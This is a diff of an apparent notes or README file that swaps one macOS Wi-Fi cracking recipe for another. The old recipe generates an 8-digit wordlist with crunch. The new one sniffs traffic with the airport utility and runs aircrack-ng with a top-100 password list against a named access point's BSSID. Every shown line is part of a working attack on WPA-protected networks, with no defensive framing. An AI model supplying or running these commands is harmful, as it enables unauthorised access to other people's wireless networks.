@@ -35,9 +35,10 @@ brew install autoconf automake libtool openssl shtool pkg-config hwloc pcre sqli
 
 ```
 airport -s
-crunch 8 8 0123456789 -o dic.txt
-aircrack-ng -w dic.txt -M 100 -f 80 -1 -a 2 -b a8:02:db:3c:b4:cb airportSniff*.cap
-
+sudo rm -rf /tmp/airport*
+sudo airport en0 sniff 3
+ls -lh /tmp/airport*
+aircrack-ng -w top100.txt -M 100 -f 80 -1 -a 2 -b 0c:5c:b5:c8:04:eb /tmp/airportSniff*.cap
 ```
 
 
